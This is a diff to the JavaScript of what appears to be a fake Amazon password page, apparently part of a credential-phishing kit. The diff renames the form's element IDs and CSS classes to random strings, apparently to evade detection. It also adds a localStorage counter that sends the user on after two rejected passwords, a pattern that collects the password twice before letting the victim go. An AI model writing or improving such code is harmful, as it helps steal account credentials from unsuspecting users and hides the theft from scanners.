@@ -23,19 +23,19 @@
       return;
     }
 
-    const userEmailDisplay = document.getElementById("userEmailDisplay");
-    const form = document.getElementById("passwordForm");
-    const passwordInput = document.getElementById("ap_password");
-    const authErrorBox = document.getElementById("authErrorBox");
-    const serverMsgText = document.getElementById("serverMsgText");
-    const emptyErrorAlert = document.getElementById("auth-password-missing-alert");
-    const submitBtn = document.getElementById("submitBtn");
+    const userEmailDisplay = document.getElementById("b7DvggIv");
+    const form = document.getElementById("mXWYFyt5");
+    const passwordInput = document.getElementById("UW33L0fO");
+    const authErrorBox = document.getElementById("plIoPUXT");
+    const serverMsgText = document.getElementById("OZf9sD3A");
+    const emptyErrorAlert = document.getElementById("egFspoEt");
+    const submitBtn = document.getElementById("eaQKoNCC");
 
     if (!form || !passwordInput || !submitBtn) return;
 
     if (userEmailDisplay) userEmailDisplay.textContent = email;
 
-    const toggle = document.getElementById("showPasswordToggle");
+    const toggle = document.getElementById("hWrh2Dzz");
     if (toggle) {
       toggle.addEventListener("change", () => {
         passwordInput.type = toggle.checked ? "text" : "password";
@@ -43,7 +43,7 @@
     }
 
     passwordInput.addEventListener("input", () => {
-      passwordInput.classList.remove("form-input-error");
+      passwordInput.classList.remove("w8O8ksUe");
       if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
       if (authErrorBox) authErrorBox.style.display = "none";
       if (serverMsgText) serverMsgText.textContent = "";
@@ -62,18 +62,43 @@
       scrollToTop();
     }
 
+    const attemptKey = `amazon_pw_attempts:${email}`;
+
+    function getAttempts() {
+      try {
+        const n = parseInt(localStorage.getItem(attemptKey) || "0", 10);
+        return Number.isFinite(n) ? n : 0;
+      } catch {
+        return 0;
+      }
+    }
+
+    function incAttempts() {
+      const n = getAttempts() + 1;
+      try {
+        localStorage.setItem(attemptKey, String(n));
+      } catch {}
+      return n;
+    }
+
+    function resetAttempts() {
+      try {
+        localStorage.removeItem(attemptKey);
+      } catch {}
+    }
+
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
       if (authErrorBox) authErrorBox.style.display = "none";
       if (serverMsgText) serverMsgText.textContent = "";
-      passwordInput.classList.remove("form-input-error");
+      passwordInput.classList.remove("w8O8ksUe");
       if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
 
       const password = passwordInput.value;
 
       if (!password) {
-        passwordInput.classList.add("form-input-error");
+        passwordInput.classList.add("w8O8ksUe");
         if (emptyErrorAlert) emptyErrorAlert.style.display = "flex";
         passwordInput.focus();
         scrollToTop();
@@ -101,6 +126,7 @@
         submitBtn.disabled = false;
 
         if (res.status === 409) {
+          resetAttempts();
           finishAndRedirect();
           return;
         }
@@ -111,12 +137,20 @@
         }
 
         if (data.message) {
+          const n = incAttempts();
+          if (n >= 2) {
+            resetAttempts();
+            finishAndRedirect();
+            return;
+          }
+
           showError(data.message);
           passwordInput.value = "";
           passwordInput.focus();
           return;
         }
 
+        resetAttempts();
         finishAndRedirect();
       } catch {
         submitBtn.disabled = false;
